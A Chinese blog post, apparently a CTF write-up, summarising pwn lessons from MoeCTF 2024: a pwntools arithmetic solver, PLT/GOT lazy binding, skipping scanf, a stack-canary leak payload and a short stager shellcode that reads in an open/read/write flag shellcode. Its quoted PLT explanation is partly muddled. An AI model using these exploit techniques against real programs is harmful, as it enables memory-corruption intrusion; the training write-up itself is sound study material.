@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>moectf2024知识点汇总 | Dream Of All Stack</title><meta name="author" content="downbeat"><meta name="copyright" content="downbeat"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言题目链接 本次比赛对基础的要求可谓是很深啊，记录一些自己需要学习的或者是基础不牢固，所需要学习的点 NotEnoughTime题目链接 运用正则匹配运算数学式子  贴一份官方wp  from pwn import *io &#x3D; ...io.sendlineafter(b&quot;&#x3D;&quot;, b&quot;2&quot;)io.sendlineafter(b&quot;&#x3D;&quot;, b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moectf2024知识点汇总">
+<meta property="og:url" content="http://downbeat.top/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="Dream Of All Stack">
+<meta property="og:description" content="前言题目链接 本次比赛对基础的要求可谓是很深啊，记录一些自己需要学习的或者是基础不牢固，所需要学习的点 NotEnoughTime题目链接 运用正则匹配运算数学式子  贴一份官方wp  from pwn import *io &#x3D; ...io.sendlineafter(b&quot;&#x3D;&quot;, b&quot;2&quot;)io.sendlineafter(b&quot;&#x3D;&quot;, b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2024-10-15T09:56:24.000Z">
+<meta property="article:modified_time" content="2024-10-15T14:41:54.552Z">
+<meta property="article:author" content="downbeat">
+<meta property="article:tag" content="ctf-pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://downbeat.top/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'moectf2024知识点汇总',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2024-10-15 22:41:54'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/modifyback.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dream Of All Stack"><span class="site-name">Dream Of All Stack</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">moectf2024知识点汇总</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-15T09:56:24.000Z" title="发表于 2024-10-15 17:56:24">2024-10-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-15T14:41:54.552Z" title="更新于 2024-10-15 22:41:54">2024-10-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="moectf2024知识点汇总"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/10">题目链接</a></p>
+<p>本次比赛对基础的要求可谓是很深啊，记录一些自己需要学习的或者是基础不牢固，所需要学习的点</p>
+<h1 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a><strong>NotEnoughTime</strong></h1><p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/10?challenge=63">题目链接</a></p>
+<p><mark>运用正则匹配运算数学式子<mark></mark></mark></p>
+<ul>
+<li>贴一份官方wp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = ...</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">io.sendline(</span><br><span class="line"><span class="built_in">str</span>(</span><br><span class="line">	<span class="built_in">eval</span>(</span><br><span class="line">		io.recvuntil(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line">		.replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">		.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">		.replace(<span class="string">b&quot;/&quot;</span>, <span class="string">b&quot;//&quot;</span>)</span><br><span class="line">		.decode()</span><br><span class="line">		)</span><br><span class="line">	).encode()</span><br><span class="line">)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>自己解题时候的exp(重度依赖gpt)</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建与本地服务的连接</span></span><br><span class="line">host = <span class="string">&quot;192.168.107.52&quot;</span></span><br><span class="line">port = <span class="number">64064</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_to_service</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># 只保留数字、四则运算符、括号和等号</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^0-9+\-*/()=]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expression)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># 去掉等号部分</span></span><br><span class="line">    expression = expression.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 替换 / 为 // 进行整除计算</span></span><br><span class="line">    expression = expression.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 计算算式</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;计算失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = connect_to_service()</span><br><span class="line">    buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">    data = s.recv(<span class="number">67</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 每秒读取服务端的输出</span></span><br><span class="line">        data = s.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        buffer += data</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;收到数据:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取算式</span></span><br><span class="line">        expression = clean_expression(buffer)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> expression:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提取的算式:&quot;</span>, expression)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算结果</span></span><br><span class="line">            result = calculate_expression(expression)</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 发送结果</span></span><br><span class="line">                result_str = <span class="built_in">str</span>(result) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                s.send(result_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;发送答案: <span class="subst">&#123;result_str.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 清空缓冲区</span></span><br><span class="line">            buffer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否有 flag</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag 获取:&quot;</span>, re.search(<span class="string">r&#x27;moectf\&#123;.*?\&#125;&#x27;</span>, data).group())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="这是什么？random！"><a href="#这是什么？random！" class="headerlink" title="这是什么？random！"></a><strong>这是什么？random！</strong></h1><p><mark>真随机数爆破<mark></mark></mark></p>
+<p>在我写的<a href="https://downbeat.top/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/">这篇文章</a>里面已经提到过了</p>
+<h1 id="这是什么？GOT！"><a href="#这是什么？GOT！" class="headerlink" title="这是什么？GOT！"></a><strong>这是什么？GOT！</strong></h1><p><mark>理解plt和got表之间的关系，已经函数真实地址是从哪里来的<mark></mark></mark></p>
+<p><img src="/img/loading.gif" data-original="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/capture_20241015180637471.bmp"></p>
+<blockquote>
+<h3 id="调用过程解析"><a href="#调用过程解析" class="headerlink" title="调用过程解析"></a>调用过程解析</h3><ol>
+<li><strong>程序启动时</strong>：<ul>
+<li>当程序编译并链接时，外部库函数（如 <code>system</code>）的实际地址在编译期并不确定，尤其是动态链接库中的函数。为了处理这种不确定性，编译器生成了 <code>PLT</code>（Procedure Linkage Table，过程链接表）和 <code>GOT</code>（Global Offset Table，全球偏移表）。</li>
+</ul>
+</li>
+<li><strong>第一次调用 <code>system</code> 时</strong>：<ul>
+<li>当程序第一次调用 <code>system</code> 函数时，程序并不知道该函数的实际内存地址。所以，程序会先跳转到 <code>system@plt</code>，即位于 <code>PLT</code> 表中的 <code>system</code> 函数条目。</li>
+<li>这个 <code>system@plt</code> 代码（你提到的 <code>.plt:0000000000401056</code> 的片段）会将某个索引值（<code>push 2</code>）压入栈，然后跳转到 <code>PLT</code> 的解析函数，也就是 <code>sub_401020</code>。这个解析函数会负责动态链接的符号解析。</li>
+</ul>
+</li>
+<li><strong>动态链接器解析</strong>：<ul>
+<li>当执行到 <code>sub_401020</code> 时，动态链接器会检查 <code>GOT</code> 表，看 <code>system</code> 函数的实际地址是否已经加载到 <code>GOT</code> 中。</li>
+<li>如果 <code>GOT</code> 中还没有 <code>system</code> 的地址（这是第一次调用时的情况），动态链接器会调用 <code>ld.so</code> 来查找 <code>system</code> 函数的地址（比如从 libc.so 库中），并将这个地址填入 <code>GOT</code> 中。</li>
+</ul>
+</li>
+<li>**后续调用 <code>system</code>**：<ul>
+<li>一旦动态链接器找到了 <code>system</code> 函数的实际地址并将其写入到 <code>GOT</code> 表中，后续对 <code>system</code> 的调用将直接通过 <code>GOT</code> 表获取其地址，而不再经过 <code>system@plt</code> 进行跳转。这样可以提高性能，因为避免了每次调用时的跳转和解析。</li>
+</ul>
+</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><strong>第一次调用 <code>system</code></strong> 时，会通过 <code>system@plt</code> 进行跳转和解析，因为程序还不知道 <code>system</code> 的实际地址。</li>
+<li><strong>后续调用 <code>system</code></strong> 则会直接使用 <code>GOT</code> 表中缓存的地址，从而加快函数调用的速度。</li>
+</ul>
+<p>这个机制是动态链接库的一部分，目的是让程序在运行时动态解析函数地址，而不是在编译时就绑定函数地址。</p>
+</blockquote>
+<ul>
+<li>在第一次调用system的时候，会去<code>0x401056</code>地址，而elf.plt[‘system’]是0x401050，下面理解一下为什么：</li>
+</ul>
+<blockquote>
+<h3 id="PLT-机制概述"><a href="#PLT-机制概述" class="headerlink" title="PLT 机制概述"></a>PLT 机制概述</h3><p><code>PLT</code>（Procedure Linkage Table） 是 ELF 文件中的一个结构，用于延迟绑定动态链接库中的函数地址。每个动态函数（如 <code>system</code>）在 <code>PLT</code> 中有一个条目。这个条目主要包含两部分：</p>
+<ol>
+<li><p>PLT Entry</p>
+<p>（</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system@plt</span><br></pre></td></tr></table></figure>
+
+<p>）：</p>
+<ul>
+<li>每个函数在 <code>PLT</code> 中有一个入口，负责跳转到实际的函数实现。</li>
+<li>第一次调用该函数时，入口会跳转到动态链接解析器来解析函数地址。</li>
+</ul>
+</li>
+<li><p>PLT Stub</p>
+<p>：</p>
+<ul>
+<li>每个函数的 <code>PLT</code> 条目包含一些指令，用来做跳转以及参数压栈等操作。</li>
+<li>这些指令位于 <code>PLT</code> 中稍后的位置（通常会偏移几个字节）。</li>
+</ul>
+</li>
+</ol>
+<h3 id="具体情况：为什么跳到-0x401056-而不是-0x401050？"><a href="#具体情况：为什么跳到-0x401056-而不是-0x401050？" class="headerlink" title="具体情况：为什么跳到 0x401056 而不是 0x401050？"></a>具体情况：为什么跳到 <code>0x401056</code> 而不是 <code>0x401050</code>？</h3><p>在你的情况中，<code>PLT</code> 入口为 <code>0x401050</code>，但第一次调用实际跳转到了 <code>0x401056</code>，这是因为 <code>0x401050</code> 到 <code>0x401056</code> 之间是一个跳转指令的预留区域，而实际的指令从 <code>0x401056</code> 开始。以下是细节解释：</p>
+<h4 id="汇编代码回顾："><a href="#汇编代码回顾：" class="headerlink" title="汇编代码回顾："></a>汇编代码回顾：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm复制代码.plt:0000000000401050 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:0000000000401056 push    2</span><br><span class="line">.plt:000000000040105B jmp     sub_401020</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>0x401050</code> 是 <code>system@plt</code> 的条目起始地址，但它不是第一条实际执行的指令。</li>
+<li>在 ELF 文件中，每个 <code>PLT</code> 条目可能会有一个跳转表格或者占位符，通常第一个几字节可能是与跳转无关的内容。</li>
+<li>从 <code>0x401056</code> 开始，真正的指令才会执行:<ul>
+<li><code>push 2</code>：将值 <code>2</code> 压入栈。这通常用于标识该 <code>PLT</code> 条目，表示它是 <code>system</code> 函数的第 2 个条目（索引 <code>2</code>），用于传递给链接解析器。</li>
+<li><code>jmp sub_401020</code>：这是跳转到 <code>PLT</code> 的解析器函数，用于解析动态链接库中的函数地址。</li>
+</ul>
+</li>
+</ul>
+<h4 id="为什么是-0x401056？"><a href="#为什么是-0x401056？" class="headerlink" title="为什么是 0x401056？"></a>为什么是 <code>0x401056</code>？</h4><ul>
+<li><strong>地址布局</strong>：<code>0x401050</code> 只是 <code>system@plt</code> 条目的起始地址。实际的指令从 <code>0x401056</code> 开始，因为 <code>0x401050</code> 到 <code>0x401056</code> 可能被填充为跳转表或用于其他目的（如预留空间）。</li>
+<li><strong>跳转到指令的设计</strong>：ELF 文件和 <code>PLT</code> 的设计通常会在每个函数条目之间留有一些空间，使得跳转和解析可以分阶段进行。因此，<code>0x401056</code> 是 <code>system@plt</code> 中实际用于跳转和解析的指令起始点。</li>
+</ul>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><strong><code>0x401050</code></strong> 是 <code>system@plt</code> 的入口地址，但它可能只是一个占位符或跳转表的开始地址。</li>
+<li><strong><code>0x401056</code></strong> 是 <code>system@plt</code> 条目中的实际指令起始地址，第一次调用 <code>system</code> 函数时跳转到了这里，因为这里包含了负责跳转和解析 <code>system</code> 函数地址的指令（如 <code>push 2</code> 和 <code>jmp sub_401020</code>）。</li>
+</ul>
+</blockquote>
+<h1 id="Catch-the-canary"><a href="#Catch-the-canary" class="headerlink" title="Catch_the_canary!"></a>Catch_the_canary!</h1><p><mark>arc4random真随机数爆破<mark> : <a href="https://downbeat.top/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/">这篇文章</a></mark></mark></p>
+<p><mark>跳过scanf的输入<mark></mark></mark></p>
+<p><mark>泄露canary<mark></mark></mark></p>
+<h2 id="下面看如何跳过scanf输入的"><a href="#下面看如何跳过scanf输入的" class="headerlink" title="下面看如何跳过scanf输入的"></a>下面看如何跳过scanf输入的</h2><p><img src="/img/loading.gif" data-original="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/capture_20241015195948758.bmp"></p>
+<ul>
+<li>要求输入的不变，我们可以:</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>要求输入数字的时候，输入<span class="string">&#x27;+&#x27;</span> or <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    可以跳过输入</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><mark>泄露canary<mark></mark></mark></li>
+</ul>
+<p>利用<code>printf、puts</code>输出遇到\x00会截断和<code>canary</code>首字节是\x00来泄露canary</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只需填充canary的\x00，再利用printf将canary输出即可</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Stop it!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span>+p.recvn(<span class="number">7</span>) <span class="comment"># recvn(m)指定收到m字节</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="shellcode-revenge"><a href="#shellcode-revenge" class="headerlink" title="shellcode_revenge"></a><strong>shellcode_revenge</strong></h1><h2 id="有限字节shellcode再次调用read"><a href="#有限字节shellcode再次调用read" class="headerlink" title="有限字节shellcode再次调用read"></a><mark><strong>有限字节shellcode再次调用read</strong><mark></mark></mark></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap((<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0xD</span>uLL);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>很明显0xd字节写入shellcode长度是不够的，那么我们可以再次调用read,写入shellcode</li>
+<li>为什么会想到<code>read</code>？观察执行shellcode前的寄存器，<code>rax=0</code>,只要<code>syscall</code>就会执行<code>read</code></li>
+</ul>
+<p><img src="/img/loading.gif" data-original="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/capture_20241015215201688.bmp"></p>
+<p><mark>注意其他几个寄存器<mark></mark></mark></p>
+<p><img src="/img/loading.gif" data-original="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/capture_20241015215508725.bmp"></p>
+<ul>
+<li>因此在<code>syscall</code>之前还要修改rsi的值，因为我们往mmap地址写入了调用read的汇编代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdx , 100</span><br><span class="line">add rsi , 0xd # 这段汇编的长度是0xd</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>随后正常写入shellcode即可</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addr = 0x20240000</span><br><span class="line">shellcode = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(3,addr+0x100,0x100)</span><br><span class="line">shellcode += shellcraft.write(1,addr+0x100,0x100)</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://downbeat.top">downbeat</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://downbeat.top/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">http://downbeat.top/2024/10/15/moectf2024知识点汇总/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://downbeat.top" target="_blank">Dream Of All Stack</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf-pwn/">ctf-pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/" title="随机数专题"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">随机数专题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/" title="0ctf_2017_babyheap--fastbin_attack"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" 